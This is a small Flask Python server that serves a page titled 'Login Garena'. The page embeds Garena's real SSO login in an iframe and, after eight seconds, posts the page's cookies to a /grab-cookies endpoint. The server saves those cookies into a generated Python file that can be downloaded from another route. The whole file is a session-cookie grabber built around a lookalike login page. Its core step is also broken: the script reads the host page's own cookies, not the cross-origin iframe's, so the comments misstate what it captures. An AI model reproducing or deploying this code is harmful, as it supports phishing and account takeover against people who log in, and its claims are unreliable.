from flask import Flask, request, render_template_string, send_file
import json
import os

app = Flask(__name__)

COOKIE_FILE = "change_cookie.py"

# Login page with iframe to Garena + JS to send cookies after 5 seconds
@app.route("/login")
def login():
    page = """
    <!DOCTYPE html>
    <html>
    <head><title>Login Garena</title></head>
    <body>
      <h3>Please log in below:</h3>
      <iframe src="https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH" width="400" height="600"></iframe>

      <script>
        setTimeout(() => {
          fetch("/grab-cookies", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cookies: document.cookie })
          }).then(() => {
            alert("Cookies sent! You can now use the bot.");
          });
        }, 8000);  // Wait 8 seconds for login
      </script>
    </body>
    </html>
    """
    return render_template_string(page)

# Receive cookies JSON, parse and save change_cookie.py
@app.route("/grab-cookies", methods=["POST"])
def grab_cookies():
    data = request.get_json()
    raw_cookies = data.get("cookies", "")
    
    # Parse cookies string into dict
    cookies = {}
    if raw_cookies:
        parts = raw_cookies.split("; ")
        for p in parts:
            if "=" in p:
                k,v = p.split("=", 1)
                cookies[k] = v

    # Save to change_cookie.py
    with open(COOKIE_FILE, "w") as f:
        f.write("def get_cookies():\n")
        f.write("    return {\n")
        for k, v in cookies.items():
            f.write(f'        "{k}": "{v}",\n')
        f.write("    }\n")

    print("Saved cookies:", cookies)
    return {"status": "success"}

# Endpoint to download the generated cookie file
@app.route("/download-cookie")
def download_cookie():
    if os.path.exists(COOKIE_FILE):
        return send_file(COOKIE_FILE, as_attachment=True)
    return "No cookie file found", 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
